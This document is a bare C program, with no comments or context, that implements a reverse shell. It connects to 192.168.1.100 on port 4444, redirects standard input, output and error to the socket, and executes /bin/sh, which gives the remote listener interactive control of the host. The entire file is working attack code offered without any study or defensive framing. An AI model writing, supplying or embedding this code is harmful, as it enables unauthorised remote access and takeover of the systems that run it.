#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>

int main() {
    int sock;
    struct sockaddr_in server;
    
    sock = socket(AF_INET, SOCK_STREAM, 0);
    server.sin_family = AF_INET;
    server.sin_port = htons(4444);
    inet_pton(AF_INET, "192.168.1.100", &server.sin_addr);
    
    connect(sock, (struct sockaddr *)&server, sizeof(server));
    
    dup2(sock, 0);
    dup2(sock, 1);
    dup2(sock, 2);
    
    execve("/bin/sh", NULL, NULL);
    return 0;
}